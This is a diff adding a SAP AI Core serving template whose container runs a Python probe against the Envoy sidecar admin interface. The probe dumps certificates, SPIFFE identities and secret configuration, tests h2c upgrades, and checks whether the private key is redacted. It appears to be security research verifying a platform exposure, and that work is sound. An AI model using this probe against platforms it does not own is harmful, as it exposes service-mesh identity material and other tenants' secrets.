@@ -1,0 +1,195 @@
+apiVersion: ai.sap.com/v1alpha1
+kind: ServingTemplate
+metadata:
+  name: h2c-verify2
+  labels:
+    scenarios.ai.sap.com/id: "h2c-verify2-scenario"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "h2c-verify2-scenario"
+    executables.ai.sap.com/name: "h2c-verify2"
+    executables.ai.sap.com/description: "envoy-admin-h2c-verify-v2"
+spec:
+  template:
+    apiVersion: "serving.kserve.io/v1beta1"
+    metadata:
+      annotations: |
+        autoscaling.knative.dev/target: 1
+      labels: |
+        ai.sap.com/resourcePlan: starter
+    spec: |
+      predictor:
+        minReplicas: 1
+        maxReplicas: 1
+        containers:
+        - name: kserve-container
+          image: python:3.11
+          command: ["/bin/sh", "-c"]
+          args:
+          - |
+            cat > /tmp/probe.py <<'PYEOF'
+            import socket, re, json, base64, subprocess
+
+            def fetch_body(path, h2c=False, label=""):
+                try:
+                    s = socket.create_connection(("127.0.0.1", 15000), timeout=15)
+                    if h2c:
+                        req = (
+                            f"GET {path} HTTP/1.1\r\n"
+                            f"Host: 127.0.0.1:15000\r\nUser-Agent: probe\r\nAccept: */*\r\n"
+                            f"Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\n"
+                            f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n\r\n"
+                        )
+                    else:
+                        req = (
+                            f"GET {path} HTTP/1.1\r\n"
+                            f"Host: 127.0.0.1:15000\r\nUser-Agent: probe\r\nAccept: */*\r\n"
+                            f"Connection: close\r\n\r\n"
+                        )
+                    s.sendall(req.encode())
+                    data = b""
+                    while True:
+                        chunk = s.recv(65536)
+                        if not chunk:
+                            break
+                        data += chunk
+                        if len(data) > 4_000_000:
+                            break
+                    s.close()
+                except Exception as e:
+                    return None, None, f"ERR:{e}"
+                head, _, body = data.partition(b"\r\n\r\n")
+                head_text = head.decode("latin1", "replace")
+                status_line = head_text.split("\r\n", 1)[0]
+                # Decode chunked transfer
+                if "transfer-encoding: chunked" in head_text.lower():
+                    decoded = b""
+                    pos = 0
+                    while pos < len(body):
+                        crlf = body.find(b"\r\n", pos)
+                        if crlf == -1:
+                            break
+                        try:
+                            sz = int(body[pos:crlf].split(b";")[0], 16)
+                        except ValueError:
+                            break
+                        if sz == 0:
+                            break
+                        decoded += body[crlf+2:crlf+2+sz]
+                        pos = crlf + 2 + sz + 2
+                    body = decoded
+                return status_line, body, None
+
+            def fetch(path, label, h2c=False):
+                status, body, err = fetch_body(path, h2c=h2c, label=label)
+                if err:
+                    print(f"[H2C] {label} {err}", flush=True)
+                    return None
+                body_len = len(body) if body else 0
+                print(f"[H2C] {label} status={status} body_len={body_len}", flush=True)
+                return body
+
+            print("[H2C] START envoy-admin-h2c-verify v2", flush=True)
+            print(f"[H2C] hostname={subprocess.check_output(['hostname']).decode().strip()}", flush=True)
+
+            # Plain HTTP/1.1 to /certs -- extract SPIFFE URI + serials directly from JSON
+            body = fetch("/certs", "CERTS_plain", h2c=False)
+            if body:
+                try:
+                    j = json.loads(body)
+                    for i, c in enumerate(j.get("certificates", [])[:1]):  # first cert pair only
+                        for chain_name in ("ca_cert", "cert_chain"):
+                            for entry in c.get(chain_name, []):
+                                serial = entry.get("serial_number")
+                                sans = entry.get("subject_alt_names", [])
+                                vfrom = entry.get("valid_from")
+                                vexp = entry.get("expiration_time")
+                                print(f"[H2C] CERTS_plain {chain_name} serial={serial} valid_from={vfrom} expiration={vexp}", flush=True)
+                                for san in sans:
+                                    print(f"[H2C] CERTS_plain {chain_name} SAN={json.dumps(san)}", flush=True)
+                except Exception as e:
+                    print(f"[H2C] CERTS_plain JSON_PARSE_ERR={e}", flush=True)
+
+            # H2C upgrade to /certs -- expected to time out, confirm
+            status, body, err = fetch_body("/certs", h2c=True, label="CERTS_h2c")
+            if err:
+                print(f"[H2C] CERTS_h2c {err}", flush=True)
+            else:
+                print(f"[H2C] CERTS_h2c status={status} body_len={len(body) if body else 0}", flush=True)
+
+            # Plain HTTP/1.1 to /config_dump?resource=dynamic_active_secrets
+            # -- extract cert chain b64, decode leaf cert PEM, parse SAN URI, confirm private_key is redacted
+            body = fetch("/config_dump?resource=dynamic_active_secrets", "SECRETS_plain", h2c=False)
+            if body:
+                try:
+                    j = json.loads(body)
+                    for cfg in j.get("configs", []):
+                        sec = cfg.get("secret", cfg)
+                        name = cfg.get("name") or sec.get("name")
+                        version = cfg.get("version_info", "?")
+                        print(f"[H2C] SECRETS_plain dynamic_secret name={name} version_info={version}", flush=True)
+                        tls = sec.get("tls_certificate", {})
+                        if tls:
+                            cc = tls.get("certificate_chain", {})
+                            pk = tls.get("private_key", {})
+                            cc_b64 = cc.get("inline_bytes", "")
+                            pk_b64 = pk.get("inline_bytes", "")
+                            # Decode the PEM b64-of-text and find SPIFFE URI in the leaf
+                            try:
+                                pem_text = base64.b64decode(cc_b64).decode("latin1", "replace")
+                                spiffe_matches = re.findall(r"spiffe://[^\s,\"\\}]+", pem_text)
+                                # Cert chain often has SAN encoded in the DER -- it shows up as printable text
+                                print(f"[H2C] SECRETS_plain certificate_chain_pem_len={len(pem_text)}", flush=True)
+                                # Print the first 4 lines of the leaf PEM as evidence
+                                pem_head = "\\n".join(pem_text.split("\n")[:4])
+                                print(f"[H2C] SECRETS_plain certificate_chain_pem_head={pem_head}", flush=True)
+                                # Decode the leaf cert's DER and look for spiffe URI in SAN extension
+                                # (the SPIFFE URI is in the DER, but printable as ASCII)
+                                pem_blocks = re.findall(r"-----BEGIN CERTIFICATE-----\s*(.+?)\s*-----END CERTIFICATE-----", pem_text, re.DOTALL)
+                                for idx, blk in enumerate(pem_blocks[:1]):  # leaf only
+                                    der = base64.b64decode(re.sub(r"\s", "", blk))
+                                    spiffe_in_der = re.findall(rb"spiffe://[\x20-\x7e]+?(?=[\x00-\x1f]|$)", der)
+                                    for sp in spiffe_in_der:
+                                        print(f"[H2C] SECRETS_plain leaf_cert_SPIFFE_URI={sp.decode('latin1','replace')}", flush=True)
+                            except Exception as e:
+                                print(f"[H2C] SECRETS_plain pem_decode_err={e}", flush=True)
+                            # Decode the private_key inline_bytes -- this is the critical proof of redaction
+                            try:
+                                pk_decoded = base64.b64decode(pk_b64).decode("latin1", "replace") if pk_b64 else "(empty)"
+                                print(f"[H2C] SECRETS_plain private_key_inline_bytes_b64={pk_b64}", flush=True)
+                                print(f"[H2C] SECRETS_plain private_key_inline_bytes_decoded={pk_decoded!r}", flush=True)
+                                print(f"[H2C] SECRETS_plain private_key_inline_bytes_len={len(pk_decoded) if pk_b64 else 0}", flush=True)
+                                if pk_decoded == "[redacted]":
+                                    print(f"[H2C] SECRETS_plain *** Envoy redacts private_key as '[redacted]' marker (10 bytes), real key NOT exposed ***", flush=True)
+                            except Exception as e:
+                                print(f"[H2C] SECRETS_plain pk_decode_err={e}", flush=True)
+                except Exception as e:
+                    print(f"[H2C] SECRETS_plain JSON_PARSE_ERR={e}", flush=True)
+
+            # H2C upgrade to /config_dump -- expected to time out
+            status, body, err = fetch_body("/config_dump?resource=dynamic_active_secrets", h2c=True, label="SECRETS_h2c")
+            if err:
+                print(f"[H2C] SECRETS_h2c {err}", flush=True)
+            else:
+                print(f"[H2C] SECRETS_h2c status={status} body_len={len(body) if body else 0}", flush=True)
+
+            # /server_info plain
+            body = fetch("/server_info", "SERVER_INFO_plain", h2c=False)
+            if body:
+                try:
+                    j = json.loads(body)
+                    print(f"[H2C] SERVER_INFO_plain version={j.get('version')} state={j.get('state')} uptime={j.get('uptime_current_epoch')}", flush=True)
+                except Exception:
+                    pass
+
+            print("[H2C] DONE", flush=True)
+            PYEOF
+            python3 /tmp/probe.py
+            python3 -c "
+            import http.server
+            class H(http.server.BaseHTTPRequestHandler):
+                def do_GET(self):
+                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+                def log_message(self, *a): pass
+            http.server.HTTPServer(('', 8080), H).serve_forever()
+            "
